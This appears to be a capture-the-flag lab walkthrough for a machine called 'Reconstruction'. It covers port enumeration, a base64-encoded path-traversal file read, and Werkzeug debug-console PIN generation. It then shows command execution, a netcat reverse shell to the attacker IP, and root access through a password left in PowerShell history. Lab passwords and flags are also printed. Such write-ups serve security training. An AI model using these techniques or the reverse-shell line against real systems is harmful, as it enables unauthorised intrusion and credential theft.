@@ -1,0 +1,209 @@
+																							    Reconstruction Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.103
+export IP=192.168.68.103
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp   open  ftp
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+nmap -Pn -n -sC -sV -p21,22,8080 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Apr 29  2020 WebSOC
+|_-rw-r--r--    1 0        0             137 Apr 29  2020 note.txt
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+|_http-title: Blog
+Service Info: OSs: Unix
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 8080 -sV --script vuln --stats-every=5s 
+
+nikto --url $IP
+ <!-- nothing -->
+ 
+Port 8080 - Enumeration
+
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP:8080/FUZZ -t 500 -mc 200 -fs 1415 -fc 404
+/login/
+
+Password required, let's use the wordlist that we have gathered from pcap files.
+
+1.05.2020.pcap
+
+# Frame 5159
+
+POST /login/ HTTP/1.1
+Host: 192.168.197.143
+password=1edfa9b54a7c0ec28fbc25babb50892e
+
+# Navigate to http://192.168.68.103:8080/login/ and use the password to log in!                            # nothing interesting here. We need better numeration
+
+dirb http://$IP:8080/data -f         # -f -- fine tunning 
+http://192.168.68.103:8080/data/@
+
+# Intercept the request with Burpsuite and notice the server response header.
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 21
+X-Error: [Errno 2] No such file or directory: ''
+Vary: Cookie
+Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.ZCarww.D74S9_5HV28C0OHRWu8Em_7jl9s; Expires=Mon, 01-May-2023 09:45:39 GMT; HttpOnly; Path=/
+Server: Werkzeug/1.0.1 Python/3.6.9
+Date: Fri, 31 Mar 2023 09:45:39 GMT
+
+Something went wrong!
+
+# Let's change the @ to a different value
+
+http://192.168.68.103:8080/data/a                         
+
+X-Error: Incorrect padding
+
+# So, let's try to encode the directory name to base 64.    a is YQ== in base64
+  
+http://192.168.68.103:8080/data/YQ==                     X-Error: [Errno 2] No such file or directory: 'a' 
+
+# Ok, this works, wtf, let's try to receive some interesting files suck as /etc/passwd in base64.
+
+http://192.168.68.103:8080/data/L2V0Yy9wYXNzd2Q=
+root:x:0:0:root:/root:/bin/bash
+-------------------------------------------
+jack:x:1001:1001::/home/jack:/bin/bash
+
+# Remember the Flask application available at /console endpoints that required a PIN? well, there is an exploitation script that allows you to generate that PIN is you have access though LFI to specific files on the system.
+   As we already found a LFI though the application, the files contents that we need are: /etc/machine-id, /proc/self/cgroup,  /sys/class/net/INTERFACE_NAME/address
+   Encode them in base64 and retrieve their values.
+   
+The following script allows you to perform this exploit
+
+https://gist.github.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42
+usage: python3 exploit.py --uuid --machineid
+
+/etc/machine-id                                           # L2V0Yy9tYWNoaW5lLWlk  
+http://192.168.68.103:8080/data/L2V0Yy9tYWNoaW5lLWlk          
+00566233196142e9961b4ea12a2bdb29
+
+/proc/self/cgroup                                        # L3Byb2Mvc2VsZi9jZ3JvdXA=
+http://192.168.68.103:8080/data/L3Byb2Mvc2VsZi9jZ3JvdXA=
+12:perf_event:/
+11:freezer:/
+10:hugetlb:/
+9:pids:/system.slice/blog.service
+8:blkio:/system.slice/blog.service
+7:cpu,cpuacct:/system.slice/blog.service
+6:net_cls,net_prio:/
+5:devices:/system.slice/blog.service
+4:cpuset:/
+3:rdma:/
+2:memory:/system.slice/blog.service
+1:name=systemd:/system.slice/blog.service
+0::/system.slice/blog.service
+
+/sys/class/net/INTERFACE_NAME/address      #  L3N5cy9jbGFzcy9uZXQvSU5URVJGQUNFX05BTUUvYWRkcmVzcw
+http://192.168.68.103:8080/data/L3N5cy9jbGFzcy9uZXQvSU5URVJGQUNFX05BTUUvYWRkcmVzcw
+
+Hello World!
+
+/sys/class/net/ens160/address
+http://192.168.68.103:8080/data/L3N5cy9jbGFzcy9uZXQvZW5zMTYwL2FkZHJlc3M=
+
+00:50:56:ba:2b:71              # we need to convert it to decimal → 345052425073
+
+# Now we can run our script using our MAC (uuid) and ID (machineid) and generate our PIN
+
+Note 
+Depending on certain events occurring during the boot cycle of this particular machine, /proc/self/cgroup is sometimes not included in the computation of the debug PIN. In fact, this anomaly occurred during this particular boot. Because of this, we are unsuccessful with the value generated for our PIN. But if it would, your script execution would be the following
+
+python3 exploit.py --machineid '00566233196142e9961b4ea12a2bdb29blog.service' --uuid 345052425073
+
+# Since the /proc/self/cgroup is not included in computer, we can use only the machineid without any additions
+
+python3 exploit.py --machineid '00566233196142e9961b4ea12a2bdb29' --uuid 345052425073
+
+2.7: 256-932-894
+3.0: 338-209-224
+3.1: 103-932-558
+3.2: 174-947-534
+3.3: 324-313-621
+3.4: 247-073-696
+3.5: 136-369-430
+3.6: 517-127-553
+3.7: 247-451-991
+3.8: 299-008-071
+
+#After going all of them, we found that the correct PIN was for Python 3.6 version
+517-127-553
+
+# We're in!! Now, all we have to do is to get shell.
+
+In the console we can test to see if you have command injection
+
+import os
+os.popen("id").read()
+'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
+
+Getting shell
+Method 1
+
+# remember the stack traces found in the login page?
+
+File "/usr/local/lib/python3.6/dist-packages/flask/app.py", line 2464, in __call__
+return self.wsgi_app(environ, start_response)
+
+# Let's call the app.py file and see if we get anything good
+
+print(os.popen("cat app.py").read())
+
+#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'
+ADMIN_PASSWORD = '1edfa9b54a7c0ec28fbc25babb50892e'
+APP_DIR = os.path.dirname(os.path.realpath(__file__))
+DATABASE = 'sqliteext:///%s' % os.path.join(APP_DIR, 'blog.db')
+DEBUG = False
+SECRET_KEY = '2d82e3a08a632feb12a4d2e1159a224750480122a1fb9845e67a7305cfff4ec8'
+SITE_WIDTH = 800
+app = Flask(__name__)
+
+# Since we know that user jack is present within our appliction, let's try the admin password and see if you get in!
+
+ssh jack@$IP 
+ee05d64d2528102d45e2db60986727ed
+
+# Got Shell
+cat local.txt                  # Flag: 9c9c65d30fa8765926d79c74901da9fc
+
+Method 2
+import os
+os.popen("id").read()
+
+nc -lvnp 80
+os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.49.68 80 >/tmp/f").read()
+# Got Shell
+
+
+Privilege escalation
+
+cat .local/share/powershell/PSReadLine/ConsoleHost_history.txt
+Write-Host -ForegroundColor Green -BackgroundColor White Holy **** this works!
+Write-Host -ForegroundColor Red -BackgroundColor Black Holy **** this works as well!
+su FlauntHiddenMotion845
+clear history
+clear
+cls
+exit
+
+su root
+FlauntHiddenMotion845
+cd /root
+cat proof.txt        #    Flag: a1fc900ea5bb50b90f6c0537c60ed85e
